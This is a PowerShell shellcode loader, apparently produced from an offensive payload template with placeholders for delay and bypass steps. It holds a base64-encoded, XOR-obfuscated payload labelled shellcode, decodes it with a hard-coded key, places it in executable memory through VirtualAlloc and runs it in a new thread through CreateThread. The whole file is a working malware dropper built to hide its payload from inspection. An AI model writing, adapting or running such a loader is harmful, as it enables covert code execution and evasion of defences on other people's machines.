function hgyD()
{
    $shellcode = "zD/GzYaklCtpYw4ZcScXeCAEZfkMK8QaUD/Oe24E33lJK8Q6YD9KnjwGGRqgK36InEskVXRgdGqoqkIJMbanxCQNBWPiMW/DcksNKKbH1KNpY08AtbcxTj5NhHviK1cMuzdlYHect30hnIYJu0PNYXeaGRqgK36InDaE4HsNVepRgzq5fHQJDX4JbfocuxcMuzdhYHecMmribwcMuzdZYHecFaBt6wdJ4DYdaC4SDXEoOw4RcS0NqppsFXmWgxcJaS0NomSlA9SWnBIAinZFKXZMVCtpK8LFMXZFKTf2ZaAG5LCdi4fwiyAN7o383tK35T/G7V5wUldj47SoRXL+bmU+O0FpOg7B6oiQakwQI0IHByA/Qys2UAU4MUZaURMmXwMgWRcoek4RBk8="
    return $shellcode
}

function Invoke-Base64Decode(){
    param(
        [Parameter(Mandatory=$True, Position=0)]
        [object] $Data
    )

    if ($Data.GetType().Name -eq "String"){
        return ([System.Convert]::FromBase64String($Data))
    }
    elseif ($Data.GetType().Name -eq "Byte[]"){
        return ([System.Convert]::FromBase64String([Encoding.UTF8]::GetString($Data)))
    }
}
function Invoke-Xor {
    [CmdletBinding()]

    param
    (
        [Parameter(Mandatory=$True)]
        [byte[]]$Data
    )
    $key = [System.Text.Encoding]::UTF8.GetBytes("0wE)vLT+icOH")

    $encoded = $(for ($i = 0; $i -lt $Data.length; ) {
        for ($j = 0; $j -lt $key.length; $j++) {
            $Data[$i] -bxor $key[$j]
            $i++
            if ($i -ge $Data.Length) {
                $j = $key.length
            }
        }
    })

    return $encoded
}
####CODE####

function Invoke-IronCyclone(){
    $Win32 = @"
    using System;
    using System.Runtime.InteropServices;
    public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        IntPtr lpThreadId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(
        IntPtr hHandle,
        UInt32 dwMilliseconds);
    }
"@
    Add-Type $Win32

    $encoded = hgyD

    [byte[]] $decoded = (Invoke-Xor (Invoke-Base64Decode $encoded));
####CALL####

    $size = $decoded.Length
    [IntPtr]$addr = [Win32]::VirtualAlloc(0,$size,0x3000,0x40);
    [System.Runtime.InteropServices.Marshal]::Copy($decoded, 0, $addr, $size)
    $thandle=[Win32]::CreateThread(0,0,$addr,0,0,0);
    [Win32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
}

####DELAY####

####BYPASS####

Invoke-IronCyclone